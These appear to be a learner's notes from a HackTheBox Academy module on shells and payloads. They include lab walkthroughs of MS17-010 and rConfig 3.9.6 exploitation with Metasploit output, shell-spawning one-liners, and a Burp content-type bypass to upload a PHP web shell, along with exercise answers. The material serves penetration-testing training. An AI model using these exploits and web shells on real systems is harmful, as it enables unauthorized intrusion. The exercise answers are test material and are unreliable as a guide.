Now that we know we are dealing with a Windows 10 host, we need to enumerate the services we can see to determine if we have a potential avenue of exploitation. To perform banner grabbing, we can use several different tools. Netcat, Nmap, and many others can perform the enumeration we need, but for this instance, we will look at a simple Nmap script called `banner.nse`. For each port Nmap sees as up, it will attempt to connect to the port and glean any information it can from it. In the session below, Nmap tried to connect to each port, but the only ports to give back a response were ports 902 and 912. Based on the page banner, they have something to do with VMWare Workstation. We can attempt to find an exploit dealing with that protocol, or we can further enumerate the other ports. In a real pentest, you will want to be as thorough as possible, making sure you have the full lay of the land.
### Bats, DLLs, & MSI Files, Oh My!

When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Each file type can accomplish different things for us, but what they all have in common is that they are executable on a host. Try to keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use.

- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.
- [Batch](https://commandwindows.com/batch.htm) Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of `.bat`. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.
- [VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.
- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run `msiexec` to execute our file, which will provide us with further access, such as an elevated reverse shell.
- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.

Now that we understand what each type of Windows file can be used for let's discuss some basic tools, tactics, and procedures for building our payloads and delivering them onto the host to land a shell.
### Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

We have plenty of good options for dealing with generating payloads to use against Windows hosts. We touched on some of these already in previous sections. For example, the Metasploit-Framework and MSFVenom is a very handy way to generate payloads since it is OS agnostic. The table below lays out some of our options. However, this is not an exhaustive list, and new resources come out daily.

|**Resource**|**Description**|
|---|---|
|`MSFVenom & Metasploit-Framework`|[Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.|
|`Payloads All The Things`|[Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.|
|`Mythic C2 Framework`|[Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.|
|`Nishang`|[Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.|
|`Darkarmour`|[Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.|
Payload Transfer and Execution:

Besides the vectors of web-drive-by, phishing emails, or dead drops, Windows hosts can provide us with several other avenues of payload delivery. The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target.

- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built in Python that provides us with a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.
- `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.

Now that we know what tools, tactics, and procedures we can use to transfer our payloads, let's check out an example compromise process.
### CMD-Prompt and PowerShells for Fun and Profit.

We are fortunate with Windows hosts to have not one but two choices for shells to utilize by default. Now you may be wondering:

`Which one is the right one to use?`

The answer is simple, the one that provides you with the capability you need at the time. Compare `cmd` and `PowerShell` for a minute to get a sense of what they offer and when it would be best to pick one over the other.

CMD shell is the original MS-DOS shell built into Windows. It was made for basic interaction and I.T. operations on a host. Some simple automation could be achieved with batch files, but that was all. Powershell came along with a purpose to expand the capabilities of cmd. PowerShell understands the native MS-DOS commands utilized in CMD and a whole new set of commands based in .NET. New self-sufficient modules can also be implemented into PowerShell with cmdlets. CMD prompt deals with text input and output while Powershell utilizes .NET objects for all input and output. Another important consideration is that CMD does not keep a record of the commands used during the session whereas, PowerShell does. So in the context of being stealthy, executing commands with cmd will leave less of a trace on the host. Other potential problems such as `Execution Policy` can inhibit your ability to execute scripts with `PowerShell` on the host. `User Account Control (UAC)` can affect both `PowerShell` and cmd. Another big concern to take into account is the age of the host. If you land on a Windows XP or older host ( yes, it's still possible..) PowerShell is not present, so your only option will be cmd. PowerShell did not come to fruition until Windows 7. So to sum it all up:

Use `CMD` when:

- You are on an older host that may not include PowerShell.
- When you only require simple interactions/access to the host.
- When you plan to use simple batch files, net commands, or MS-DOS native tools.
- When you believe that execution policies may affect your ability to run scripts or other actions on the host.

Use `PowerShell` when:

- You are planning to utilize cmdlets or other custom-built scripts.
- When you wish to interact with .NET objects instead of text output.
- When being stealthy is of lesser concern.
- If you are planning to interact with cloud-based services and hosts.
- If your scripts set and use Aliases.
### WSL and PowerShell For Linux

The Windows Subsystem for Linux is a powerful new tool that has been introduced to Windows hosts that provides a virtual Linux environment built into your host. We mention this because the rapidly changing landscape of operating systems may very well allow for novel ways of gaining access to a host. When writing this module, several examples of malware in the wild were attempting to utilize Python3 and Linux binaries to download and install payloads onto a Windows host via WSL. Much like in this post [here](https://www.bleepingcomputer.com/news/security/new-malware-uses-windows-subsystem-for-linux-for-stealthy-attacks/), attackers are also using built-in Python libraries that are native to both Windows and Linux alongside PowerShell to perform other actions on the host. One other thing to note is currently, any network requests or functions executed to or from the WSL instance are not parsed by the Windows Firewall and Windows Defender, making it a bit of a blind spot on the host.

The same issues can currently be found via PowerShell Core, which can be installed on Linux operating systems and carry over many normal PowerShell functions. These two concepts are exceptionally sneaky because, to date, not much is known about the vectors of attack or ways to watch for them. But attacks aimed at these features have been seen to avoid AV and EDR detection mechanisms. These concepts are a bit advanced for this module.
### Exercise

1. What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')             `.bat`

2. What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)           `MS17-010`     (EternalBlue)

3. Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\

Target IP:      10.129.201.97

```bash
└─$ nmap -v 10.129.201.97 --script banner.nse

Discovered open port 139/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 135/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97

PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman


msf > use auxiliary(scanner/smb/smb_ms17_010) 
msf auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
RHOSTS => 10.129.201.97
[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.37/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf > use auxiliary/scanner/smb/smb_ms17_010

msf exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.201.97
RHOSTS => 10.129.201.97
msf exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.15.30
LHOST => 10.10.15.30
msf exploit(windows/smb/ms17_010_psexec) > run

meterpreter > shell
Process 296 created.
Channel 1 created.
cMicrosoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\>type flag.txt
type flag.txt
EB-Still-W0rk$
```

---
# NIX Shells
## Infiltrating Unix/Linux

W3Techs maintains an ongoing OS usage statistics [study](https://w3techs.com/technologies/overview/operating_system). This study reports that over `70%` of websites (webservers) run on a Unix-based system. For us, this means we can significantly benefit from continuing to grow our knowledge of Unix/Linux and how we can gain shell sessions on these environments to potentially pivot further within an environment. While it is common for organizations to use 3rd parties & cloud providers to host their websites & web apps, many organizations still host their websites & web applications on servers in their network environments (on-prem). In these cases, we would want to establish a shell session with the underlying system to attempt to pivot to other systems on the internal network.

As you may very well have noticed by now, gaining a shell session with a system can be done in various ways, one common way is through a vulnerability in an application. We will identify a vulnerability and discover an exploit that we can use to gain a shell by delivering a payload. When considering how we will establish a shell session on a Unix/Linux system, we will benefit from considering the following:

- What distribution of Linux is the system running?
- What shell & programming languages exist on the system?
- What function is the system serving for the network environment it is on?
- What application is the system hosting?
- Are there any known vulnerabilities?

Let's dive deeper into this concept by attacking a vulnerable application hosted on a Linux system. Keep the questions in mind and take notes as we go through this. Can you answer them?

Keeping our goal of `gaining a shell session` in mind, we must establish some next steps after examining our scan output.

`What information could we gather from the output?`

Considering we can see the system is listening on ports 80 (`HTTP`), 443 (`HTTPS`), 3306 (`MySQL`), and 21 (`FTP`), it may be safe to assume that this is a web server hosting a web application. We can also see some version numbers revealed associated with the web stack (`Apache 2.4.6` and `PHP 7.2.34` ) and the distribution of Linux running on the system (`CentOS`). Before deciding on a direction to research further (dive down a rabbit hole), we should also try navigating to the IP address through a web browser to discover the hosted application if possible.
We can see that it may be worthwhile to choose this as the main focus of our research. The same thinking could be applied to the Apache and PHP versions, but since the application is running on the web stack, let's see if we can gain a shell through an exploit written for the vulnerabilities found in rConfig.

We can also use Metasploit's search functionality to see if any exploit modules can get us a shell session on the target.

One detail that can be overlooked when relying on MSF to find an exploit module for a specific application is the version of MSF. There may be useful exploit modules that are not installed on our system or just aren't showing up via search. In these cases, it's good to know that Rapid 7 keeps code for exploit modules in their [repos on github](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits). We could do an even more specific search using a search engine: `rConfig 3.9.6 exploit metasploit github`

This search can point us to the source code for an exploit module called `rconfig_vendors_auth_file_upload_rce.rb`. This exploit can get us a shell session on a target Linux box running rConfig 3.9.6. If this exploit did not show up in the MSF search, we can copy the code from this repo onto our local attack box and save it in the directory that our local install of MSF is referencing. To do this, we can issue this command on our attack box:

```bash
mdn0x@htb[/htb]$ locate exploits
```

We want to look for the directories in the output associated with Metasploit Framework. On Pwnbox, Metasploit exploit modules are kept in:

`/usr/share/metasploit-framework/modules/exploits`

We can copy the code into a file and save it in `/usr/share/metasploit-framework/modules/exploits/linux/http` similar to where they are storing the code in the GitHub repo. We should also keep msf up to date using the commands `apt update; apt install metasploit-framework` or your local package manager. Once we find the exploit module and download it (we can use wget) or copy it into the proper directory from Github, we can use it to gain a shell session on the target. If we copy it into a file on our local system, make sure the file has `.rb` as the extension. All modules in MSF are written in Ruby.

In msfconsole, we can manually load the exploit using the command:

```
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

With this exploit selected, we can list the options, input the proper settings specific to our network environment, and launch the exploit.

We can see from the steps outlined in the exploitation process that this exploit:

- Checks for the vulnerable version of rConfig
- Authenticates with the rConfig web login
- Uploads a PHP-based payload for a reverse shell connection
- Deletes the payload
- Leaves us with a Meterpreter shell session
### Spawning a TTY Shell with Python

When we drop into the system shell, we notice that no prompt is present, yet we can still issue some system commands. This is a shell typically referred to as a `non-tty shell`. These shells have limited functionality and can often prevent our use of essential commands like `su` (`switch user`) and `sudo` (`super user do`), which we will likely need if we seek to escalate privileges. This happened because the payload was executed on the target by the apache user. Our session is established as the apache user. Normally, admins are not accessing the system as the apache user, so there is no need for a shell interpreter language to be defined in the environment variables associated with apache.

We can manually spawn a TTY shell using Python if it is present on the system. We can always check for Python's presence on Linux systems by typing the command: `which python`. To spawn the TTY shell session using Python, we type the following command:


```python
python -c 'import pty; pty.spawn("/bin/sh")' 
```

This command uses python to import the [pty module](https://docs.python.org/3/library/pty.html), then uses the `pty.spawn` function to execute the `bourne shell binary` (`/bin/sh`). We now have a prompt (`sh-4.2$`) and access to more system commands to move about the system as we please.
## Exercise

1. What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?        `php`

2. Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.        `edgerouter-isp.`
### SCAN

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Shells_Payloads]
└─$ rustscan -a target.htb -- -A  

Open 10.129.192.187:22
Open 10.129.192.187:21
Open 10.129.192.187:80
Open 10.129.192.187:111
Open 10.129.192.187:443
Open 10.129.192.187:3306

PORT     STATE SERVICE  REASON         VERSION
21/tcp   open  ftp      syn-ack ttl 63 vsftpd 2.0.8 or later
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)

80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS


111/tcp  open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)

3306/tcp open  mysql    syn-ack ttl 63 MySQL (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.14
```

### Discovering a Vulnerability

**rConfig Version 3.9.6   © rConfig 2015 - 2026 **   
on https://target.htb/login.php

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Shells_Payloads]
└─$ searchsploit rconfig 3.9.6          
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
rConfig 3.9.6 - 'path' Local File Inclusion (Authenticated | php/webapps/49644.txt
rconfig 3.9.6 - Arbitrary File Upload                      | php/webapps/49783.py
rConfig 3.9.6 - Arbitrary File Upload to Remote Code Execu | php/webapps/49665.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### Gaining Access


```bash
─$ locate rconfig_vendors_auth_file_upload_rce.rb
/usr/share/metasploit-framework/modules/exploits/linux/http/rconfig_vendors_auth_file_upload_rce.rb

msf > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce

msf exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set rhosts target.htb
msf exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set lhosts tun0

msf exploit(multi/handler) > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce.rb
[*] Using configured payload php/meterpreter/reverse_tcp

msf exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > run
[*] Started reverse TCP handler on 10.10.15.108:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[!] Not following HTTP redirect: redirect depth exhausted
[+] We successfully logged in !
[*] Uploading file 'gjgctxtwmkf.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (72686 bytes) to 10.129.192.196
[*] Sending stage (72686 bytes) to 10.129.192.196
[*] 10.129.192.196 - Meterpreter session 87 closed.  Reason: Died
[*] Sending stage (72686 bytes) to 10.129.192.196
[-] Meterpreter session 88 is not valid and will be closed
[*] 10.129.192.196 - Meterpreter session 88 closed.
[*] 10.129.192.196 - Meterpreter session 88 closed.  Reason: Died
```

It's not working for me, tried several times.

**ls /devicedetails/**
edgerouter-isp.yml
hostnameinfo.txt
## Spawning Interactive Shells

At the end of the last section, we established a shell session with the target. Initially, our shell was limited (sometimes referred to as a jail shell), so we used python to spawn a TTY bourne shell to give us access to more commands and a prompt to work from. This will likely be a situation we find ourselves in more and more as we practice on Hack The Box and in the real world on engagements.

There may be times that we land on a system with a limited shell, and Python is not installed. In these cases, it's good to know that we could use several different methods to spawn an interactive shell. Let's examine some of them.

Know that whenever we see `/bin/sh` or `/bin/bash`, this could also be replaced with the binary associated with the shell interpreter language present on that system. With most Linux systems, we will likely come across `bourne shell` (`/bin/sh`) and `bourne again shell` (`/bin/bash`) present on the system natively.

This command will execute the shell interpreter specified in the path in interactive mode (`-i`).

```bash
 /bin/sh -i
```


If the programming language [Perl](https://www.perl.org) is present on the system, these commands will execute the shell interpreter specified.

```
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
```



If the programming language [Ruby](https://www.ruby-lang.org/en/) is present on the system, this command will execute the shell interpreter specified:

```
ruby: exec "/bin/sh"
```

[Find](https://man7.org/linux/man-pages/man1/find.1.html) is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.

```
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

This use of the find command uses the execute option (`-exec`) to initiate the shell interpreter directly. If `find` can't find the specified file, then no shell will be attained.

```
find . -exec /bin/sh \; -quit
```

Yes, we can set the shell interpreter language from within the popular command-line-based text-editor `VIM`. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.

```
vim -c ':!/bin/sh'
```

to escape:

```
vim -c ':!/bin/sh'
```

---
# Web Shells
## Intro to Web Shells

It is almost guaranteed that we will come across web servers in our time learning and actively engaging in the practice of pentesting. Much of the world's software services are moving to web-based platforms accessible over the world wide web using a web browser and HTTP/S. Just consider the website we are on now. It is entirely in the browser, accessible from anywhere in the world using any Internet-connected device. Modern entertainment mediums like `video games`, `music`, and `video streaming` are accessible through browsers and apps. This means we will find ourselves targeting web applications more and more as time goes on.

Furthermore, during external penetration tests, we often find that clients' perimeter networks are well-hardened. They do not expose vulnerable services such as SMB or other elements that we used to frequently encounter. Those elements we now primarily anticipate during an internal penetration test. During our external penetration tests, we most commonly "get in" (gain a foothold inside the internal network) via web application attacks (file upload attacks, SQL injection, RFI/LFI, command injection, etc.), password spraying (against RDS, VPN portals, Citrix, OWA, and other applications using Active Directory authentication), and social engineering.

Web applications are often the majority of what we see exposed during an external network assessment and often present an enormous attack surface. We may find publicly available file upload forms that let us directly upload a PHP, JSP, or ASP.NET web shell. Some functionality during authenticated testing may be present or, our personal favorite, a self-registration functionality where we can go in and upload a web shell (after bypassing client-side checks) in the user profile picture upload area. We may also come across applications such as Tomcat, Axis2, or WebLogic, which allow you to deploy JSP code via a WAR file as part of their functionality. We may even find a misconfigured FTP service that allows file uploads directly to the server's webroot. There are many other ways that we may find to upload a web shell that is outside the scope of this module. What comes next once we have identified an unrestricted upload vulnerability or misconfiguration?

A `web shell` is a browser-based shell session we can use to interact with the underlying operating system of a web server. Again, to gain remote code execution via web shell, we must first find a website or web application vulnerability that can give us file upload capabilities. Most web shells are gained by uploading a payload written in a web language on the target server. The payload(s) we upload should give us remote code execution capability within the browser. The proceeding sections and challenges will primarily be focused on executing commands through our web shells in the browser. Still, it is essential to know that relying on the web shell alone to interact with the system can be unstable and unreliable because some web applications are configured to delete file uploads after a certain period of time. To achieve persistence on a system, in many cases, this is the initial way of gaining remote code execution via a web application, which we can then use to later upgrade to a more interactive reverse shell.

In the following few sections, we will learn and experiment with various web shells that allow us to interact with a web server's underlying OS through the web browser.

## Laudanum

Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include `asp, aspx, jsp, php,` and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it [here](https://github.com/jbarcia/Web-Shells/tree/master/laudanum). Let's examine Laudanum and see how it works.

The Laudanum files can be found in the `/usr/share/laudanum` directory. For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run. For specific files such as the shells, you must edit the file first to insert your `attacking` host IP address to ensure you can access the web shell or receive a callback in the instance that you use a reverse shell. Before using the different files, be sure to read the contents and comments to ensure you take the proper actions.
### Q&A

1. Establish a web shell session with the target using the concepts covered in this section. Submit the full path of the directory you land in. (Format: c:\path\you\land\in)         `c:\windows\system32\inetsrv`

2. Where is the Laudanum aspx web shell located on Pwnbox? Submit the full path. (Format: /path/to/laudanum/aspx)             `/usr/share/laudanum/aspx/shell.aspx`
## Antak Webshell

Before diving into aspx shell concepts and exercises, we should take the time to cover a learning resource that can help reinforce most of the concepts covered here in HTB Academy. Occasionally it can be a challenge to visualize a concept using just one learning method. It is good to supplement reading with watching demonstrations and performing hands-on as we have been doing thus far. Video walkthroughs can be an amazing way to learn concepts, plus they can be consumed casually (eating lunch, laying in bed, sitting on the couch, etc.). One great resource to use in learning is `IPPSEC's` blog site [ippsec.rocks](https://ippsec.rocks/?#). The site is a powerful learning tool. Take, for example, the concept of web shells. We can use his site to type in the concept we want to learn, like aspx.

His site crawls the descriptions of each of the videos he has posted on YouTube and recommends a timestamp associated with that keyword. When we click one of the links, it will take us to that section of the video where this concept is demonstrated. It's like a search engine to learn hacking skills. To gain a good basic understanding of what an aspx web shell is, let's watch the short portion of IPPSEC's demonstration of the retired box [Cereal](https://www.youtube.com/watch?v=04ZBIioD5pA&t=4677s). The link should start us at the 1-hour 17-minute mark. Watch from 1 hour 17-minute mark to the 1-hour 20-minute mark.

We will notice that he uploaded the file via HTTP then navigated to the file using the web browser. This gave him the capability to send commands to and receive output from the underlying Windows operating system.

`How does aspx work?`

`Active Server Page Extended` (`ASPX`) is a file type/extension written for [Microsoft's ASP.NET Framework](https://docs.microsoft.com/en-us/aspnet/overview). On a web server running the ASP.NET framework, web form pages can be generated for users to input data. On the server side, the information will be converted into HTML. We can take advantage of this by using an ASPX-based web shell to control the underlying Windows operating system. Let's witness this first-hand by utilizing the Antak Webshell.

Antak is a web shell built in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang). Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest. Since we are focused on web applications for the moment, let's keep our eyes on `Antak`. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server. The UI is even themed like PowerShell. It's time to dive in and experiment with Antak

The Antak files can be found in the `/usr/share/nishang/Antak-WebShell` directory.
Antak web shell functions like a Powershell Console. However, it will execute each command as a new process. It can also execute scripts in memory and encode commands you send. As a web shell, Antak is a pretty powerful tool.
### Q&A

1. Where is the Antak webshell located on Pwnbox? Submit the full path. (Format:/path/to/antakwebshell)    `/usr/share/nishang/Antak/antak.aspx`

2. Establish a web shell with the target using the concepts covered in this section. Submit the name of the user on the target that the commands are being issued as. In order to get the correct answer you must navigate to the web shell you upload using the vHost name.     `iis apppool\status`

## PHP Web Shells

Hypertext Preprocessor or [PHP](https://www.php.net) is an open-source general-purpose scripting language typically used as part of a web stack that powers a website. At the time of this writing (October 2021), PHP is the most popular `server-side programming language`. According to a [recent survey](https://w3techs.com/technologies/details/pl-php) conducted by W3Techs, "PHP is used by `78.6%` of all websites whose server-side programming language we know".

Recall the rConfig server from earlier in this module? It uses PHP. We can see a `login.php` file. So when we select the login button after filling out the Username and Password field, that information is processed server-side using PHP. Knowing that a web server is using PHP gives us pentesters a clue that we may gain a PHP-based web shell on this system. Let's work through this concept hands-on.

Since PHP processes code & commands on the server-side, we can use pre-written payloads to gain a shell through the browser or initiate a reverse shell session with our attack box. In this case, we will take advantage of the vulnerability in rConfig 3.9.6 to manually upload a PHP web shell and interact with the underlying Linux host. In addition to all the functionality mentioned earlier, rConfig allows admins to add network devices and categorize them by vendor. Go ahead and log in to rConfig with the default credentials (admin:admin), then navigate to `Devices` > `Vendors` and click `Add Vendor`.

We will be using [WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell). We can download this or copy and paste the source code into a `.php` file. Keep in mind that the file type is significant, as we will soon witness. Our goal is to upload the PHP web shell via the Vendor Logo `browse` button. Attempting to do this initially will fail since rConfig is checking for the file type. It will only allow uploading image file types (.png,.jpg,.gif, etc.). However, we can bypass this utilizing `Burp Suite`.

Start Burp Suite, navigate to the browser's network settings menu and fill out the proxy settings. `127.0.0.1` will go in the IP address field, and `8080` will go in the port field to ensure all requests pass through Burp (recall that Burp acts as the web proxy).

Our goal is to change the `content-type` to bypass the file type restriction in uploading files to be "presented" as the vendor logo so we can navigate to that file and have our web shell.

With Burp open and our web browser proxy settings properly configured, we can now upload the PHP web shell. Click the browse button, navigate to wherever our .php file is stored on our attack box, and select open and `Save` (we may need to accept the PortSwigger Certificate). It will seem as if the web page is hanging, but that's just because we need to tell Burp to forward the HTTP requests. Forward requests until you see the POST request containing our file upload. 

As mentioned in an earlier section, you will notice that some payloads have comments from the author that explain usage, provide kudos and links to personal blogs. This can give us away, so it's not always best to leave the comments in place. We will change Content-type from `application/x-php` to `image/gif`. This will essentially "trick" the server and allow us to upload the .php file, bypassing the file type restriction. Once we do this, we can select `Forward` twice, and the file will be submitted. We can turn the Burp interceptor off now and go back to the browser to see the results.

The message: `Added new vendor NetVen to Database` lets us know our file upload was successful. We can also see the NetVen vendor entry with the logo showcasing a ripped piece of paper. This means rConfig did not recognize the file type as an image, so it defaulted to that image. We can now attempt to use our web shell. Using the browser, navigate to this directory on the rConfig server:

`/images/vendor/connect.php`

This executes the payload and provides us with a non-interactive shell session entirely in the browser, allowing us to execute commands on the underlying OS.
### Considerations when Dealing with Web Shells

When utilizing web shells, consider the below potential issues that may arise during your penetration testing process:

- Web applications sometimes automatically delete files after a pre-defined period
- Limited interactivity with the operating system in terms of navigating the file system, downloading and uploading files, chaining commands together may not work (ex. `whoami && hostname`), slowing progress, especially when performing enumeration -Potential instability through a non-interactive web shell
- Greater chance of leaving behind proof that we were successful in our attack

Depending on the engagement type (i.e., a black box evasive assessment), we may need to attempt to go undetected and `cover our tracks`. We are often helping our clients test their capabilities to detect a live threat, so we should emulate as much as possible the methods a malicious attacker may attempt, including attempting to operate stealthily. This will help our client and save us in the long run from having files discovered after an engagement period is over. In most cases, when attempting to gain a shell session with a target, it would be wise to establish a reverse shell and then delete the executed payload. Also, we must document every method we attempt, what worked & what did not work, and even the names of the payloads & files we tried to use. We could include a sha1sum or MD5 hash of the file name, upload locations in our reports as proof, and provide attribution.
### Exercise

1. In the example shown, what must the Content-Type be changed to in order to successfully upload the web shell? (Format: .../... )               `image/gif`

2. Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: xxxx.gif) 

```bash
------WebKitFormBoundaryZpLAjJ7EfzI1VeFt
Content-Disposition: form-data; name="vendorName"

shell
------WebKitFormBoundaryZpLAjJ7EfzI1VeFt
Content-Disposition: form-data; name="vendorLogo"; filename="shell.php"
Content-Type: image/gif

#<?php
/*******************************************************************************
 * Copyright 2017 WhiteWinterWolf
```

http://10.129.201.101/images/vendor/shell.php

```bash
**ls**
ajax-loader.gif
cisco.jpg
juniper.jpg
shell.php
```

---
# The Live Engagement

[The Live Engagement - Shells&Payloads Skill Assessment](../../../The%20Live%20Engagement%20-%20Shells&Payloads%20Skill%20Assessment.md)

# Additional Considerations
## Detection & Prevention

We are on the downslope now! Let's take a break from our super-spy business of infiltrating hosts and take a look at the defensive side. This section explores ways to detect active shells, look for payloads on a host and over network traffic, and how these attacks can be obfuscated to bypass our defenses.

When it comes to looking for and identifying active shells, payload delivery and execution, and potential attempts to subvert our defenses, we have many different options to utilize to detect and respond to these events. Before talking about data sources and tools we can use, let's take a second to talk about the [MITRE ATT&CK Framework](https://attack.mitre.org/) and define the techniques and tactics being utilized by attackers. The `ATT&CK Framework` as defined by MITRE, is "`a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations`."

Keeping the framework in mind, three of the most notable techniques we can tie to Shells & Payloads are listed below in the table with descriptions.

Events To Watch For:

